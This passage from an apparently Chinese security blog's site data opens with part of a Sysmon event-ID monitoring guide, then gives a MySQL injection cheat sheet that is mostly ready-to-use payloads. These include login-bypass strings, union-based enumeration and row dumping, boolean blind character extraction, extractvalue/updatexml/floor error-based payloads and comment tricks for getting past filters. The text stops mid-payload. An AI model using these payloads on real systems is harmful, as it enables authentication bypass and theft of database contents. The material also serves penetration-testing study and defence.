16：ServiceConfigurationChange</h3><p>此事件记录Sysmon配置中的更改-例如，更新过滤规则时。</p><h3 id="事件ID-17：PipeEvent（已创建管道）"><a href="#事件ID-17：PipeEvent（已创建管道）" class="headerlink" title="事件ID 17：PipeEvent（已创建管道）"></a>事件ID 17：PipeEvent（已创建管道）</h3><p>创建命名管道时，将生成此事件。恶意软件通常使用命名管道进行进程间通信。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819163221080.png" alt="image-20210819163221080"></p><h3 id="事件ID-18：PipeEvent（已连接管道）"><a href="#事件ID-18：PipeEvent（已连接管道）" class="headerlink" title="事件ID 18：PipeEvent（已连接管道）"></a>事件ID 18：PipeEvent（已连接管道）</h3><p>在客户端和服务器之间建立命名管道连接时，将记录此事件。</p><h3 id="事件ID-19：WmiEvent（检测到WmiEventFilter活动）"><a href="#事件ID-19：WmiEvent（检测到WmiEventFilter活动）" class="headerlink" title="事件ID 19：WmiEvent（检测到WmiEventFilter活动）"></a>事件ID 19：WmiEvent（检测到WmiEventFilter活动）</h3><p>注册WMI事件筛选器（恶意软件执行该方法）后，此事件将记录WMI名称空间，筛选器名称和筛选器表达式。</p><h3 id="事件ID-20：WmiEvent（检测到WmiEventConsumer活动）"><a href="#事件ID-20：WmiEvent（检测到WmiEventConsumer活动）" class="headerlink" title="事件ID 20：WmiEvent（检测到WmiEventConsumer活动）"></a>事件ID 20：WmiEvent（检测到WmiEventConsumer活动）</h3><p>此事件记录WMI使用者的注册，记录使用者名称，日志和目的地。</p><h3 id="事件ID-21：WmiEvent（检测到WmiEventConsumerToFilter活动）"><a href="#事件ID-21：WmiEvent（检测到WmiEventConsumerToFilter活动）" class="headerlink" title="事件ID 21：WmiEvent（检测到WmiEventConsumerToFilter活动）"></a>事件ID 21：WmiEvent（检测到WmiEventConsumerToFilter活动）</h3><p>当使用者绑定到过滤器时，此事件记录使用者名称和过滤器路径。</p><h3 id="事件ID22：DNS查询"><a href="#事件ID22：DNS查询" class="headerlink" title="事件ID22：DNS查询"></a>事件ID22：DNS查询</h3><p>记录DNS查询，容易受该功能影响的一种场景就是DNS的C2通信，其中大量请求会被记录下来。</p><p>过滤Event ID 22，可以重点关注“DNS query”（DNS请求）事件。</p><h3 id="事件ID23：检测到文件删除"><a href="#事件ID23：检测到文件删除" class="headerlink" title="事件ID23：检测到文件删除"></a>事件ID23：检测到文件删除</h3><p>文件删除记录</p><h3 id="事件ID24"><a href="#事件ID24" class="headerlink" title="事件ID24"></a>事件ID24</h3><p>Sysmon版本在12之后多了一个事件 ID 24用于记录剪切板事件。</p><h3 id="事件ID-255：错误"><a href="#事件ID-255：错误" class="headerlink" title="事件ID 255：错误"></a>事件ID 255：错误</h3><p>Sysmon中发生错误时，将生成此事件。如果系统负载沉重，某些任务无法执行，或者Sysmon服务中存在错误，则可能发生这种情况。您可以在Sysinternals论坛或Twitter（@markrussinovich）上报告任何错误。</p><h2 id="Sysmon工具"><a href="#Sysmon工具" class="headerlink" title="Sysmon工具"></a>Sysmon工具</h2><p><a href="https://github.com/nshalabi/SysmonTools.git">https://github.com/nshalabi/SysmonTools.git</a></p><h3 id="Sysmon-View"><a href="#Sysmon-View" class="headerlink" title="Sysmon View"></a>Sysmon View</h3><p>Sysmon View是Sysmon产生日志的可视化查看进程信息的辅助工具。</p><p>cmd下执行以下命令导出xml格式的日志文档，可通过Sysmon View辅助工具实现对其可视化显示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WEVTUtil query-events &quot;Microsoft-Windows-Sysmon/Operational&quot; /format:xml /e:sysmonview &gt; eventlog.xml</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1628229368340-011f11c7-d34f-4529-aa88-618842014feb.png" alt="img"></p><p><strong>安全日志查询</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819192109256.png" alt="image-20210819192109256"></p><h3 id="sysmon-shell"><a href="#sysmon-shell" class="headerlink" title="sysmon shell"></a>sysmon shell</h3><p>通过简单的GUI界面帮助编写和应用Sysmon XML配置，需要导入配置文件。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1628230616204-b77c1243-a27d-4f42-a34e-71cb4f35bac1.png" alt="img"></p><p>除了导出Sysmon事件日志外，Sysmon Shell还可以用于探索Sysmon可用的各种配置选项，轻松应用和更新XML配置。</p><ol><li><p>Sysmon Shell可以加载Sysmon XML配置文件：当前版本支持所有Sysmon架构。（该工具不直接从注册表加载任何配置，仅从XML文件加载）。</p></li><li><p>可以将最终的XML导出/保存到文件中。</p></li><li><p>可以通过Sysmon.exe -c command直接调用（在安装Sysmon的同一文件夹中创建临时XML文件）来应用生成的XML配置文件，因此，如果使用此功能，Sysmon Shell将需要提升的权限（需要继承此权限）从Sysmon进程本身），应用配置的输出将显示在预览平台中（这是Sysmon生成的输出）</p></li><li><p>可以在保存在预览窗格中之前预览XML配置</p></li><li><p>最后一个选项卡（标记为“Logs Export”）可能会很方便地将Sysmon事件日志快速导出到XML，以后可以使用“Sysmon View”进行事件分析，导出有三个选项：<img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210819185323827.png" alt="image-20210819185323827"></p><p>*仅出口</p><p>*导出并清除Sysmon事件日志</p><p>*导出，备份evtx文件并清除事件日志</p></li></ol><h2 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Sysmon实战分析Word恶意文件</span><br><span class="line">https://www.syspanda.com/index.php/2017/10/10/threat-hunting-sysmon-word-document-macro/</span><br><span class="line"># sysmon分析影子账户</span><br><span class="line">https://blog.51cto.com/u_14153008/2745323</span><br><span class="line"># sysmon学习文档</span><br><span class="line">https://github.com/MHaggis/sysmon-dfir</span><br><span class="line"># 使用Sysmon和Splunk探测网络环境中横向渗透</span><br><span class="line">https://cloud.tencent.com/developer/article/1041591</span><br><span class="line"># 微软轻量级系统监控工具sysmon原理与实现完全分析</span><br><span class="line">https://www.anquanke.com/post/id/156704</span><br><span class="line">Sysmon DNS查询</span><br><span class="line">https://www.anquanke.com/post/id/180418</span><br><span class="line">报错解决：</span><br><span class="line">https://superuser.com/questions/1482486/installation-error-of-sysmon-on-windows-7-vm-sysmondrv-driver-and-startservice</span><br><span class="line">辅助工具：</span><br><span class="line">https://www.yuque.com/p1ut0/xer98r/ugrtrf</span><br><span class="line">Sysmon官方文档</span><br><span class="line">https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 安全事件监控 </tag>
            
            <tag> windows安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入</title>
      <link href="/2021/08/15/MySQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/08/15/MySQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="information-schema数据库三张表"><a href="#information-schema数据库三张表" class="headerlink" title="information_schema数据库三张表"></a>information_schema数据库三张表</h2><h3 id="information-schema-schemata"><a href="#information-schema-schemata" class="headerlink" title="information_schema.schemata:"></a>information_schema.schemata:</h3><blockquote><p>该数据表存储了mysql数据库中的所有数据库的库名</p></blockquote><p> <img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426488028-61a016bc-8ffc-4fee-a011-250bde7061f4.png" alt="image.png"></p><h3 id="information-schema-tables"><a href="#information-schema-tables" class="headerlink" title="information_schema.tables"></a>information_schema.tables</h3><blockquote><p>该数据表存储了mysql数据库中的所有数据表的表名</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426528926-8cf88db6-5c5a-4fa6-9bb0-351ac7e6390b.png" alt="image.png"></p><h3 id="information-schema-columns"><a href="#information-schema-columns" class="headerlink" title="information_schema.columns"></a>information_schema.columns</h3><blockquote><p>该数据表存储了mysql数据库中的所有列的列名</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/1597426541299-0d3a9e82-2f80-40e4-8db4-14a8e5844a46.png" alt="image.png"></p><span id="more"></span><h2 id="常见注入参数"><a href="#常见注入参数" class="headerlink" title="常见注入参数"></a>常见注入参数</h2><p>| 参数 | 释义 |<br>| user() | 当前数据库用户 |<br>| database() | 当前数据库名 |<br>| version() | 当前使用数据库版本 |<br>| @@datadir | 数据库<strong>存储数据路径</strong> |<br>| concat() | <strong>联合数据</strong>，用于联合两条数据结果。如 concat(username,0x3a,password) |<br>| group_concat() | group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 |<br>| concat_ws() | 用法类似 |<br>| hex() &amp; unhex() | 用于 <strong>hex</strong> 编码解码 |<br>| ascii(str) | 返回给定字符的<strong>ascii值</strong>，如果str是空字符串，返回0 |<br>| length(str) | 返回给定<strong>字符串的长度</strong>，如  length(“string”)=6 |<br>| substr(string,start,length) | 对于给定字符串string，从start位开始<strong>截取</strong>，截取length长度 |<br>| load_file() | 以文本方式<strong>读取文件</strong>，在 Windows 中，路径设置为 \ |<br>| substr()、stbstring()、mid() | 三个函数的用法、功能均一致 |<br>| select xxoo into outfile ‘路径’ | 权限较高时可直接<strong>写文件</strong> |<br>| CHAR() | 把整数转换为对应的字符 |</p><h2 id="Mysql中注释"><a href="#Mysql中注释" class="headerlink" title="Mysql中注释"></a>Mysql中注释</h2><p><strong>单行注释：</strong><code>#</code> &amp; <code>-</code></p><p><strong>多行注释，可以实现行内注释</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*注释内容*/</span><br><span class="line">DROP/*comment*/sampletable</span><br><span class="line">DR/**/OP/*绕过过滤*/sampletable  </span><br><span class="line">SELECT/*替换空格*/password/**/FROM/**/Members</span><br></pre></td></tr></table></figure><p><code>/* */</code>这种注释方式还有一种扩展，即当在注释中使用！加上版本号时，只要mysql的当前版本<strong>等于或大于</strong>该版本号，则该注释中的sql语句将被mysql执行。这种方式只适用于mysql数据库。不具有其他数据库的可移植性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27/**//*!12440UNION*//**//*!12440SELECT*/1111,2222,3333%23 HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="后台万能密码"><a href="#后台万能密码" class="headerlink" title="后台万能密码"></a>后台万能密码</h2><h3 id="输入点在用户名"><a href="#输入点在用户名" class="headerlink" title="输入点在用户名"></a>输入点在用户名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">admin&#x27;</span> #</span><br><span class="line">admin<span class="string">&#x27;/*</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- </span></span><br><span class="line"><span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#x27;) or &#x27;1&#x27;=&#x27;1-- </span></span><br><span class="line"><span class="comment">&#x27;) or (&#x27;1&#x27;=&#x27;1-- </span></span><br><span class="line"><span class="comment">以不同的用户登陆 &#x27; UNION SELECT 1, &#x27;anotheruser&#x27;, &#x27;doesnt matter&#x27;, 1--</span></span><br></pre></td></tr></table></figure><h3 id="输入点在密码"><a href="#输入点在密码" class="headerlink" title="输入点在密码"></a>输入点在密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;or 1%23</span></span><br><span class="line"><span class="string">&#x27;</span>)<span class="keyword">or</span>(<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h3><p><strong>schema_name  –&gt; schemata</strong><br><strong>table_name –&gt; tables</strong><br><strong>column_name –&gt; columns</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">判断当前表的字段数量</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;order by 3#</span></span><br><span class="line"><span class="string">3正确4报错就有字段数为3</span></span><br><span class="line"><span class="string">通过union联合查询来知道回显字段的位置</span></span><br><span class="line"><span class="string">?id=1&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br><span class="line">注：设置id<span class="operator">=</span><span class="number">-1</span> 这样数据库中没有id<span class="operator">=</span><span class="number">-1</span>的数据，所以就会返回<span class="keyword">union</span> <span class="keyword">select</span>的结果</span><br><span class="line">使用mysql内置函数获取信息</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span></span><br><span class="line">获得所有的数据库</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata#</span><br><span class="line">kuming数据库的所有表</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kuming&#x27;</span> </span><br><span class="line">kuming数据库中biaoming表中的所有列</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;kuming&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;biaoming&#x27;</span> </span><br><span class="line">biaoming表中，三列数据的所有内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(lieming1,<span class="string">&#x27;--&#x27;</span>,lieming2,<span class="string">&#x27;--&#x27;</span>,lieming3),<span class="number">3</span> <span class="keyword">from</span> biaoming</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> lieming1 <span class="keyword">from</span> kuming.biaoming limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="Boolean盲注"><a href="#Boolean盲注" class="headerlink" title="Boolean盲注"></a>Boolean盲注</h2><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p><strong>left(a)=b</strong></p><blockquote><p>sql的left()函数如果式子成立返回1如果不成立返回 0</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210821183018114.png" alt="image-20210821183018114"></p><p><strong>MID(s,n,len)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or ((ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;65)--+</span></span><br></pre></td></tr></table></figure><blockquote><p>注：从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)。注意字符串从1开始，而非0，Length是可选项，如果没有提供，<code>MID()</code>函数将返回余下的字符串。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210821220656380.png" alt="image-20210821220656380"></p><h3 id="判断当前数据库名"><a href="#判断当前数据库名" class="headerlink" title="判断当前数据库名"></a>判断当前数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断数据库长度</span><br><span class="line"><span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span><span class="comment">--+</span></span><br><span class="line">判断数据库字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>  ##二分法</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;s&#x27;</span>  ##爆破法</span><br></pre></td></tr></table></figure><blockquote><p>以上方法不适用于access和SQL Server数据库</p></blockquote><h3 id="判断当前数据库中的表"><a href="#判断当前数据库中的表" class="headerlink" title="判断当前数据库中的表"></a>判断当前数据库中的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜测当前数据库是否存在xxxxx表</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> xxxxx)</span><br><span class="line">判断当前数据库中表的个数</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">=</span><span class="number">4</span></span><br><span class="line">判断每个表的长度</span><br><span class="line">判断第一张表的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span></span><br><span class="line">判断第二张表的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span></span><br><span class="line">判断每个表的每个字符的ASCII值</span><br><span class="line">第一个表第一个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">第一个表第二个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">第二个表第一个字符</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="判断表中的字段"><a href="#判断表中的字段" class="headerlink" title="判断表中的字段"></a>判断表中的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> username <span class="keyword">from</span> admin)</span><br><span class="line">判断表中字段个数</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断字段的长度</span><br><span class="line">判断第一个字段的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断第二个字段的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断字段的ascii值</span><br><span class="line">判断第一个字段的第一个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断第一个字段的第二个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断第二个字段的第一个字符的长度</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="判断字段中的数据"><a href="#判断字段中的数据" class="headerlink" title="判断字段中的数据"></a>判断字段中的数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断数据的长度</span><br><span class="line">判断id字段的第一个数据的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断id字段的第二个数据的长度</span><br><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">判断数据的ASCII值</span><br><span class="line">判断id字段的第一个数据的第一个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">判断id字段的第一个数据的第二个字符的ascii值</span><br><span class="line"><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h2 id="报错注入-过滤空格"><a href="#报错注入-过滤空格" class="headerlink" title="报错注入(过滤空格)"></a>报错注入(过滤空格)</h2><p><code>select/insert/update/delete</code>都可以使用报错来获取信息。</p><h3 id="ExtractValue报错注入"><a href="#ExtractValue报错注入" class="headerlink" title="ExtractValue报错注入"></a>ExtractValue报错注入</h3><p>MYSQL对XML文档数据进行查询和修改的XPATH函数</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><strong>EXTRACTVALUE (XML_document, XPath_string)</strong></p><p>第一个参数：<code>XML_document</code> 是 String 格式，为 XML 文档对象的名称.</p><p>第二个参数：<code>XPath_string</code> (Xpath 格式的字符串).</p><p>作用：从目标 XML 中返回包含所查询值的字符串.</p><mark class="hl-label orange">注意:</mark>  返回结果 限制在32位字符.<h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="UpdateXml报错注入"><a href="#UpdateXml报错注入" class="headerlink" title="UpdateXml报错注入"></a>UpdateXml报错注入</h3><p>MYSQL对XML文档数据进行查询和修改的XPATH函数</p><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p><strong>UPDATEXML (XML_document, XPath_string, new_value)</strong><br>第一个参数：<code>XML_document</code> 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1<br>第二个参数：<code>XPath_string</code> (Xpath 格式的字符串)<br>第三个参数：<code>new_value</code>，String 格式，替换查找到的符合条件的数据</p><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,version,<span class="number">0</span>)#</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="Floor报错注入"><a href="#Floor报错注入" class="headerlink" title="Floor报错注入"></a>Floor报错注入</h3><p>MYSQL中用来取整的函数</p><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p><strong>FLOOR(x)</strong></p><p>返回小于或等于 x 的最大整数（向下取整）</p><h4 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span 